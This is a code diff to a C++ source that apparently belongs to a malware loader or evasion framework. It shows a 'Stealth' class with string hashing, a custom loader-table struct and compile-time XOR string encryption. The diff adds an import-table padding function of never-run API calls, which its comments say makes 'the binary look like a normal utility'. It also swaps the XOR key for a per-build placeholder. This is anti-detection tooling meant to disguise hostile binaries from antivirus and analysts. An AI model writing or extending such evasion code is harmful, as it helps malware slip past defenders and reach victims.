@@ -101,6 +101,41 @@ typedef struct _MY_LDR_DATA_TABLE_ENTRY {
     UNICODE_STRING BaseDllName;
 } MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;
 
+// IAT padding — benign references that populate the import table so the binary
+// looks like a normal utility.  The volatile guard prevents the compiler
+// from proving the calls are unreachable, which would let it strip them.
+#ifdef _MSC_VER
+__declspec(noinline) static void _iat_pad() {
+#else
+__attribute__((noinline, used)) static void _iat_pad() {
+#endif
+    volatile int z = 0;
+    if (z) {
+        // kernel32 — file / path / environment (normal utility)
+        GetTempPathW(0, NULL);
+        GetModuleFileNameW(NULL, NULL, 0);
+        GetCurrentDirectoryW(0, NULL);
+        GetEnvironmentVariableW(NULL, NULL, 0);
+        ExpandEnvironmentStringsW(NULL, NULL, 0);
+        CreateFileW(NULL, 0, 0, NULL, 0, 0, NULL);
+        ReadFile(NULL, NULL, 0, NULL, NULL);
+        WriteFile(NULL, NULL, 0, NULL, NULL);
+        GetFileSize(NULL, NULL);
+        FindFirstFileW(NULL, NULL);
+        FindNextFileW(NULL, NULL);
+        FindClose(NULL);
+        GetCurrentProcessId();
+        Sleep(0);
+        // advapi32 — registry (normal utility)
+        RegOpenKeyExW(NULL, NULL, 0, 0, NULL);
+        RegQueryValueExW(NULL, NULL, NULL, NULL, NULL, NULL);
+        RegCloseKey(NULL);
+        // kernel32 — console
+        GetStdHandle(0);
+        SetConsoleTitleW(NULL);
+    }
+}
+
 class Stealth {
 private:
     static uint64_t HashString(const char* str) {
@@ -179,7 +214,7 @@ public:
 };
 
 // --- String Encryption ---
-constexpr char KEY = 0x55;
+constexpr char KEY = 0x__XOR_KEY__;
 
 template <size_t N, size_t... Is>
 constexpr auto encrypt(const char (&str)[N], std::index_sequence<Is...>) {
